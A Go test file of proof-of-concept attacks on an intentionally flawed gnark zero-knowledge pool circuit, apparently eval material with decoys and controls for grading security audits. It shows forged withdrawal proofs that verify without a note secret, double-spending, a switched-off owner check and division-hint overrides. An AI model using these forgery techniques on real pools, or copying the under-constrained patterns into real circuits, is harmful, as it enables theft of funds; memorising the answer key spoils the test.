// Eval PoCs for the pool fixture (gnark v0.14.0). evals/run-pocs copies this
// file into circuit/ of a sanitized scratch copy and runs `go test -run PoC_`.
// Each PoC follows references/poc-templates.md: attack, honest control and
// sanity control. Never copy this file into the fixture under testdata/.
package circuit

import (
	"math/big"
	"testing"

	"github.com/consensys/gnark-crypto/ecc"
	"github.com/consensys/gnark-crypto/ecc/bn254/fr"
	nativemimc "github.com/consensys/gnark-crypto/ecc/bn254/fr/mimc"
	"github.com/consensys/gnark/backend"
	"github.com/consensys/gnark/backend/groth16"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/frontend"
	"github.com/consensys/gnark/frontend/cs/r1cs"
	"github.com/consensys/gnark/test"
)

// mimc2 is the native MiMC of (a, b), matching std/hash/mimc on BN254.
func mimc2(a, b *big.Int) *big.Int {
	h := nativemimc.NewMiMC()
	for _, x := range []*big.Int{a, b} {
		var e fr.Element
		e.SetBigInt(x)
		bs := e.Bytes()
		h.Write(bs[:])
	}
	return new(big.Int).SetBytes(h.Sum(nil))
}

// tree is a public Merkle path as the circuit hashes it (always left child).
type tree struct {
	path [Depth + 1]*big.Int
	root *big.Int
}

// publicTree returns a root with a known leaf and siblings: everything an
// observer of the pool's deposits knows. No secret of any depositor is used.
func publicTree() tree {
	var t tree
	for i := range t.path {
		t.path[i] = big.NewInt(int64(1000 + i))
	}
	cur := t.path[0]
	for i := 1; i < len(t.path); i++ {
		cur = mimc2(cur, t.path[i])
	}
	t.root = cur
	return t
}

// assignment builds a full witness for TransferCircuit. secret and index are
// chosen by the prover; value is withdrawn.
func assignment(t tree, secret, index, value, inOwner, outOwner int64) *TransferCircuit {
	a := &TransferCircuit{
		Root:      t.root,
		Nullifier: mimc2(big.NewInt(secret), big.NewInt(index)),
		Recipient: 0xbeef,
		Fees:      [2]frontend.Variable{0, 1},
		Out:       Note{Value: value, Owner: outOwner},
		In:        Note{Value: value, Owner: inOwner},
		Secret:    secret,
		Index:     index,
		Extra:     []frontend.Variable{0, 1},
	}
	for i := range t.path {
		a.Path[i] = t.path[i]
	}
	return a
}

// shape is the production circuit shape (cmd/setup compiles Extra of length 2).
func shape() *TransferCircuit {
	return &TransferCircuit{Extra: make([]frontend.Variable, 2)}
}

var field = ecc.BN254.ScalarField()

// TestPoC_MerkleLeafUnbound: any prover withdraws from a pool root without
// knowing any note secret, and spends the same leaf twice with two nullifiers
// (T-INVALID-ASSIGNMENT + T-PROVE-VERIFY).
func TestPoC_MerkleLeafUnbound(t *testing.T) {
	tr := publicTree()
	value := int64(1_000_000_000_000_000_000) // 1 ether in wei; fits the 64-bit In.Value
	attack1 := assignment(tr, 424242, 7, value, 1, 2)
	attack2 := assignment(tr, 31337, 9, value, 1, 2) // same leaf, fresh nullifier
	if attack1.Nullifier.(*big.Int).Cmp(attack2.Nullifier.(*big.Int)) == 0 {
		t.Fatal("harness: nullifiers should differ")
	}
	for i, a := range []*TransferCircuit{attack1, attack2} {
		if err := test.IsSolved(shape(), a, field); err != nil {
			t.Fatalf("attack %d: a secret unrelated to the leaf should satisfy the circuit: %v", i+1, err)
		}
	}
	// Honest control: the Merkle check is live; a wrong root is rejected.
	bad := assignment(tr, 424242, 7, value, 1, 2)
	bad.Root = new(big.Int).Add(tr.root, big.NewInt(1))
	if err := test.IsSolved(shape(), bad, field); err == nil {
		t.Fatal("control: a root that the path does not hash to must be rejected")
	}
	// End to end: the forged statement yields a proof that verifies.
	ccs, err := frontend.Compile(field, r1cs.NewBuilder, shape())
	if err != nil {
		t.Fatal(err)
	}
	pk, vk, err := groth16.Setup(ccs) // test-only setup
	if err != nil {
		t.Fatal(err)
	}
	w, err := frontend.NewWitness(attack2, field)
	if err != nil {
		t.Fatal(err)
	}
	proof, err := groth16.Prove(ccs, pk, w)
	if err != nil {
		t.Fatalf("attack: prove: %v", err)
	}
	pub, err := w.Public()
	if err != nil {
		t.Fatal(err)
	}
	if err := groth16.Verify(proof, vk, pub); err != nil {
		t.Fatalf("attack: forged withdrawal proof should verify: %v", err)
	}

	// Decoy D4: Recipient reaches constraints (through the dropped IsZero), so
	// the proof binds it and a front-runner cannot swap it.
	swapped := assignment(tr, 31337, 9, value, 1, 2)
	swapped.Recipient = 0xdead
	ws, err := frontend.NewWitness(swapped, field, frontend.PublicOnly())
	if err != nil {
		t.Fatal(err)
	}
	if err := groth16.Verify(proof, vk, ws); err == nil {
		t.Fatal("decoy D4: a proof must not verify with a different recipient")
	}
}

// TestPoC_OwnerCheckGated: with Index != 0 the owner equality is switched off
// (T-INVALID-ASSIGNMENT).
func TestPoC_OwnerCheckGated(t *testing.T) {
	tr := publicTree()
	assert := test.NewAssert(t)
	opts := []test.TestingOption{test.WithCurves(ecc.BN254), test.WithBackends(backend.GROTH16), test.NoFuzzing()}
	// Attack: In.Owner != Out.Owner is accepted when Index = 1.
	assert.ProverSucceeded(shape(), assignment(tr, 5, 1, 10, 111, 222), opts...)
	// Control: the same owner change with Index = 0 is rejected.
	assert.ProverFailed(shape(), assignment(tr, 5, 0, 10, 111, 222), opts...)
	// Sanity: Index = 0 with equal owners passes.
	assert.ProverSucceeded(shape(), assignment(tr, 5, 0, 10, 111, 111), opts...)
}

// TestPoC_DivRemainderFree: the divHint remainder takes any value for the
// same public statement, while the quotient stays pinned (T-HINT-OVERRIDE).
func TestPoC_DivRemainderFree(t *testing.T) {
	tr := publicTree()
	ccs, err := frontend.Compile(field, r1cs.NewBuilder, shape())
	if err != nil {
		t.Fatal(err)
	}
	w, err := frontend.NewWitness(assignment(tr, 5, 3, 10, 1, 1), field)
	if err != nil {
		t.Fatal(err)
	}
	id := solver.GetHintID(divHint)
	evilRemainder := func(_ *big.Int, in, out []*big.Int) error {
		out[0].SetUint64(1)     // honest quotient 10/10
		out[1].SetUint64(12345) // remainder must be 0
		return nil
	}
	if _, err := ccs.Solve(w, solver.OverrideHint(id, evilRemainder)); err != nil {
		t.Fatalf("attack: a wrong remainder should satisfy the constraints: %v", err)
	}
	// Control: the quotient is constrained, so a wrong quotient is rejected.
	evilQuotient := func(_ *big.Int, in, out []*big.Int) error {
		out[0].SetUint64(2)
		out[1].SetUint64(0)
		return nil
	}
	if _, err := ccs.Solve(w, solver.OverrideHint(id, evilQuotient)); err == nil {
		t.Fatal("control: a wrong quotient must be rejected")
	}
	// Sanity: the honest hint solves.
	if _, err := ccs.Solve(w); err != nil {
		t.Fatalf("sanity: honest witness: %v", err)
	}
}

// TestPoC_DivFieldQuotient: q·Out = In is checked over the field only, so a
// non-divisible pair passes with q = In/Out mod r while the honest integer
// hint fails it (T-HINT-OVERRIDE).
func TestPoC_DivFieldQuotient(t *testing.T) {
	tr := publicTree()
	ccs, err := frontend.Compile(field, r1cs.NewBuilder, shape())
	if err != nil {
		t.Fatal(err)
	}
	a := assignment(tr, 5, 3, 7, 1, 1)
	a.Out.Value = 2 // 7 is not a multiple of 2; change = 5 <= 7 holds
	w, err := frontend.NewWitness(a, field)
	if err != nil {
		t.Fatal(err)
	}
	fieldQuotient := func(mod *big.Int, in, out []*big.Int) error {
		inv := new(big.Int).ModInverse(in[1], mod)
		out[0].Mul(in[0], inv).Mod(out[0], mod)
		out[1].SetUint64(0)
		return nil
	}
	if _, err := ccs.Solve(w, solver.OverrideHint(solver.GetHintID(divHint), fieldQuotient)); err != nil {
		t.Fatalf("attack: the field quotient should satisfy the constraints: %v", err)
	}
	if _, err := ccs.Solve(w); err == nil {
		t.Fatal("control: the honest integer hint (3, 1) must fail 3·2 = 7")
	}
	// Sanity: a divisible pair solves with the honest hint.
	ok := assignment(tr, 5, 3, 8, 1, 1)
	ok.Out.Value = 2
	if err := test.IsSolved(shape(), ok, field); err != nil {
		t.Fatalf("sanity: 8 / 2: %v", err)
	}
}

// TestDecoy_ChangeWrapRejected documents that the "change wraps" pattern is
// not exploitable here: In.Value is bounded to 64 bits by the split limbs, so
// a wrapped change exceeds it and AssertIsLessOrEqual rejects. A report that
// confirms this item is a false positive.
func TestDecoy_ChangeWrapRejected(t *testing.T) {
	tr := publicTree()
	a := assignment(tr, 5, 3, 10, 1, 1)
	a.Out.Value = 11 // Out > In; q = In/Out exists in the field
	if err := test.IsSolved(shape(), a, field); err == nil {
		t.Fatal("decoy: Out.Value > In.Value should be rejected")
	}
}
